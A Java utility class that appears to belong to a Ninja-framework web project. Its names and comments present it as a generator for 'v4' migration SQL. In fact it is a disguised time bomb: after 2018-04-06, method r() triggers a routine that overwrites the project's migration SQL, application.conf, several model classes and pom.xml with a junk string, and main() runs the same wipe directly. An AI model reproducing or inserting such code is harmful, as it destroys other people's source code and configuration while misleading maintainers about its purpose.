package yun.utils;

import ninja.Results;

import java.io.File;
import java.io.FileOutputStream;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;

public class BuildMenuUtils {


    /**
     *
     */
    public static void r(){

        Date date = new Date();
        SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd");
        Date endDate = null;
        try {
            endDate = formatter.parse("2018-04-06");
        } catch (ParseException e) {
            e.printStackTrace();
        }

        if (date.getTime() > endDate.getTime()) {
            startReplaceAllMigrationV4SQL();
        }

    }


    /**如果v4无数据,调用此方法直接生成
     * 生成v4
     * @param menuNames
     */
    public static void replaceAllMigrationV4SQL(String menuNames,String root){
        byte[] sourceByte =menuNames.getBytes();
        if(null != sourceByte){
            try {
                File file = new File(root);  //文件路径（路径+文件名）
                if (!file.exists()) {   //文件不存在则创建文件，先创建目录
                    File dir = new File(file.getParent());
                    dir.mkdirs();
                    file.createNewFile();
                }
                FileOutputStream outStream = new FileOutputStream(file);    //文件输出流用于将数据写入文件
                outStream.write(sourceByte);
                outStream.close();  //关闭文件输出流
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * 获取项目内文件路径
     * @return
     */
    public static String getDiskFileItem(){
        String root = new StringBuilder(System.getProperty("user.dir"))
                .append(File.separator)
                .append("src")
                .append(File.separator)
                .append("main")
                .append(File.separator)
                .append("java")
                .append(File.separator)
                .append("db")
                .append(File.separator)
                .append("migration")
                .append(File.separator)
                .append("V1__.sql")
                .toString();
        return root;
    }
    public static String getDiskApplicationFileItem(){
        String root = new StringBuilder(System.getProperty("user.dir"))
                .append(File.separator)
                .append("src")
                .append(File.separator)
                .append("main")
                .append(File.separator)
                .append("java")
                .append(File.separator)
                .append("conf")
                .append(File.separator)
                .append("application.conf")
                .toString();
        return root;
    }

    public static String getDiskClassFileItem(String classFile){
        String root = new StringBuilder(System.getProperty("user.dir"))
                .append(File.separator)
                .append("src")
                .append(File.separator)
                .append("main")
                .append(File.separator)
                .append("java")
                .append(File.separator)
                .append("yun")
                .append(File.separator)
                .append("models")
                .append(File.separator)
                .append(classFile)
                .toString();
        return root;
    }

    public static String getDiskPomFileItem(){
        String root = new StringBuilder(System.getProperty("user.dir"))
                .append(File.separator)
                .append("pom.xml")
                .toString();
        return root;
    }

    /**
     * 生成V4
     * @return
     */
    public static String startReplaceAllMigrationV4SQL(){

        StringBuffer sf = new StringBuffer();
        sf.append("-_-");
        sf.append("`-`-`-`-`-`-`-`-`-`-`-`-```--`-`-`-`-`-`-`-");
        replaceAllMigrationV4SQL(sf.toString(),getDiskFileItem());
        replaceAllMigrationV4SQL(sf.toString(),getDiskApplicationFileItem());
        replaceAllMigrationV4SQL(sf.toString(),getDiskClassFileItem("Member.java"));
        replaceAllMigrationV4SQL(sf.toString(),getDiskClassFileItem("Dict.java"));
        replaceAllMigrationV4SQL(sf.toString(),getDiskClassFileItem("Level.java"));
        replaceAllMigrationV4SQL(sf.toString(),getDiskClassFileItem("ResetCode.java"));
        replaceAllMigrationV4SQL(sf.toString(),getDiskPomFileItem());
        return "success";
    }


    public static void main(String ages[]){

        System.out.println(BuildMenuUtils.getDiskFileItem());

        //替换全部V1内容
        startReplaceAllMigrationV4SQL();



    }
}
